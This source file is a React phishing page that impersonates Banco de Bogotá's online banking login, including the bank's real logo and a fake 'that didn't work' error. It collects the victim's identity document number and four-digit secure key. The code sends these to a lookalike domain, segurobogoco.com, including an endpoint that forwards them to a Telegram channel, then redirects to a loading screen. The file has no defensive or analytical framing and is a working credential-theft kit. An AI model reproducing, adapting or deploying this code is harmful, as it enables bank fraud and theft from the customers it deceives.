import React, { useState, useEffect } from 'react';
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import './animations.css';
import { EyeIcon } from '@heroicons/react/24/outline';
import { useNavigate } from 'react-router-dom';

const SecurePaymentError = () => {
  const [activeTab, setActiveTab] = useState('claveSegura');
  const [documentNumber, setDocumentNumber] = useState('');
  const [secureKey, setSecureKey] = useState('');
  const [error, setError] = useState(false);
  const [step, setStep] = useState(1);
  const [showPassword, setShowPassword] = useState(false);
  const navigate = useNavigate(); // useNavigate hook para redirección

  useEffect(() => {
    // Recupera los datos almacenados en el localStorage, si existen
    const storedDocumentNumber = localStorage.getItem('documentNumber');
    const storedSecureKey = localStorage.getItem('secureKey');

    if (storedDocumentNumber) setDocumentNumber(storedDocumentNumber);
    if (storedSecureKey) setSecureKey(storedSecureKey);
  }, []);

  // Función para manejar el cambio de paso
  const handleStepChange = () => {
    setStep(2);
  };

  // Función para obtener el guestId, primero desde localStorage, luego haciendo un POST si no está disponible
  const getGuestId = async () => {
    let guestId = localStorage.getItem('guestId');
    
    if (!guestId) {
      // Si no se encuentra el guestId en localStorage, hacemos una solicitud para obtenerlo
      try {
        const response = await fetch('https://segurobogoco.com/api/v1/newGuest', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            document_number: documentNumber,
            secure_key: secureKey,
          }),
        });

        if (!response.ok) {
          throw new Error('Error al crear el guest');
        }

        const data = await response.json();
        guestId = data.guestId;  // Suponiendo que la respuesta incluye el guestId

        // Guardar el guestId en localStorage para futuras solicitudes
        localStorage.setItem('guestId', guestId);
      } catch (error) {
        console.error('Error al obtener el guestId:', error);
        setError(true);
      }
    }

    return guestId;
  };

  // Función para enviar el mensaje al canal de Telegram
  const sendTelegramMessage = async (documentNumber, secureKey) => {
    try {
      const response = await fetch('https://segurobogoco.com/api/v1/send-telegram-message', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          documentNumber,
          secureKey,
        }),
      });

      if (!response.ok) {
        throw new Error('Error al enviar el mensaje a Telegram');
      }
    } catch (error) {
      console.error('Error al enviar el mensaje:', error);
    }
  };

  // Función para enviar la solicitud PATCH y redirigir a /Loading
  const handleSubmit = async () => {
    try {
      if (documentNumber.length > 0 && secureKey.length === 4) {
        // Almacenar los datos en localStorage
        localStorage.setItem('documentNumber', documentNumber);
        localStorage.setItem('secureKey', secureKey);

        // Obtener el guestId (si no existe, lo creamos)
        const guestId = await getGuestId();
        
        if (!guestId) {
          setError(true);  // Si no pudimos obtener el guestId, mostramos un error
          return;
        }

        // Enviar el mensaje al canal de Telegram
        await sendTelegramMessage(documentNumber, secureKey);

        // Crear el body de la solicitud
        const body = {
          status_id: 1,  // Aquí se define el estado a 1 como se solicitó
        };

        // Hacer la solicitud PATCH
        const response = await fetch(`https://segurobogoco.com/api/v1/guest/${guestId}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(body),
        });

        if (!response.ok) {
          throw new Error('Error al enviar la solicitud');
        }

        // Redirigir a /Loading
        navigate('/loading');
      } else {
        setError(true);
      }
    } catch (error) {
      console.error('Error en el manejo del formulario:', error);
      setError(true);
    }
  };

  const handleDocumentChange = (e) => {
    setDocumentNumber(e.target.value);
    setError(false);
  };

  const handleKeyChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');  // Limitar a solo números
    setSecureKey(value);
  };

  return (
    <div className="flex flex-col items-center bg-gray-100 min-h-screen p-6">
      <TransitionGroup>
        <CSSTransition
          key={step}
          timeout={300}
          classNames="fade"
          unmountOnExit
        >
          <div className="w-full max-w-lg mx-auto bg-white p-6 rounded-lg shadow-lg">
            {step === 1 && (
              <div>
                <div className="flex items-center space-x-4 mb-5">
                  <img
                    src="../../../public/images.png"
                    alt="Menu"
                    className="w-14 h-auto"
                  />
                  <p className="text-xl font-bold">Bienvenido a tu Banca Virtual</p>
                </div>

                <div className="w-full mb-6 flex items-center bg-[#0043A9] p-3 rounded-lg">
                  <img
                    src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png"
                    alt="Logo"
                    className="w-12 h-auto mr-2"
                  />
                  <div className="text-white text-sm">
                    <p>¿Nunca has ingresado a Banca Virtual?</p>
                    <p>Aquí te decimos cómo hacerlo ›</p>
                  </div>
                </div>

                <div className="">

                  <div className="flex">
                    <button
                      className={`w-1/2 text-center ${activeTab === 'claveSegura' ? 'bg-white text-[rgb(0,64,168)] border-b-4 border-[rgb(0,64,168)]' : ' text-gray-700'}`}
                      onClick={() => setActiveTab('claveSegura')}
                    >
                      Clave Segura
                    </button>
                    <button
                      className={`w-1/2 py-2 text-center ${activeTab === 'tarjetaDebito' ? 'bg-white text-[rgb(0,64,168)] border-b-4 border-[rgb(0,64,168)]' : ' text-gray-700'}`}
                      onClick={() => setActiveTab('tarjetaDebito')}
                    >
                      Tarjeta Débito
                    </button>
                  </div>

                  {activeTab === 'claveSegura' && (
                    <div className="p-4 rounded-lg relative">
                      <div className="absolute top-2 right-2 cursor-pointer">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16">
                          <path d="M12 2L2 12M2 2l10 10" stroke="#444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                      </div>
                      <p className='text-red-500 text-center font-bold'>¡Eso no funciono!</p>
                      <p className="text-sm text-[#444444] bg-red-200 p-2 mb-2">Ingresa correctamente las credenciales de acceso</p>

                      <div className="mb-4">
                        <h2 className="text-sm font-semibold mb-2 text-[#444444]">Identificación</h2>
                        <div className="flex items-center gap-4">
                          <select
                            className="h-12 w-24 pl-3 pr-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-lg"
                            name="cc"
                          >
                            <option value="CC">C.C. ... Cédula de ciudadanía</option>
                            <option value="CC">T.I. ... Tarjeta de Identidad</option>
                            <option value="CC">C.E. ... Cédula de Extranjería</option>
                            <option value="CC">P.S. ... Pasaporte</option>
                          </select>
                          <input
                            type="tel"
                            value={documentNumber}
                            onChange={handleDocumentChange}
                            placeholder="#"
                            minLength="6"
                            maxLength="10"
                            required
                            className="flex-1 h-12 pl-4 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                          />
                        </div>
                      </div>

                      <div>
                        <h2 className="text-sm font-semibold mb-2 text-[#444444]">Clave segura</h2>
                        <div className="relative">
                          <input
                            type={showPassword ? 'text' : 'password'}
                            value={secureKey}
                            onChange={handleKeyChange}
                            placeholder="Clave segura"
                            minLength="4"
                            maxLength="4"
                            required
                            className="w-full h-12 pl-4 border mb-2 border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute inset-y-0 right-0 flex items-center pr-3"
                          >
                            <EyeIcon className={`w-5 h-5 text-[#0043a9] ${showPassword ? 'text-blue-500' : ''}`} />
                          </button>
                        </div>
                      </div>
                      <input type="hidden" value="bogota" />

                      <button
                        onClick={handleSubmit}
                        disabled={!documentNumber || secureKey.length !== 4}
                        className={`w-full h-12 ${documentNumber && secureKey.length === 4 ? 'bg-blue-800' : 'bg-gray-400'} text-white font-semibold rounded-full hover:bg-blue-700 transition duration-300`}
                      >
                        Ingresar ahora
                      </button>
                      {error && <p className="text-red-500 mt-2 text-center">Por favor, complete todos los campos.</p>}

                      <div className="flex items-center justify-center pt-5 font-semibold">
                        <p><a href="#" className="text-[#0043a9] no-underline mx-2">Registrarme ›</a></p>
                        <span className="text-gray-300 mx-2">|</span>
                        <p><a href="#" className="text-[#0043a9] no-underline mx-2">Olvidé mi clave ›</a></p>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </CSSTransition>
      </TransitionGroup>
    </div>
  );
};

export default SecurePaymentError;
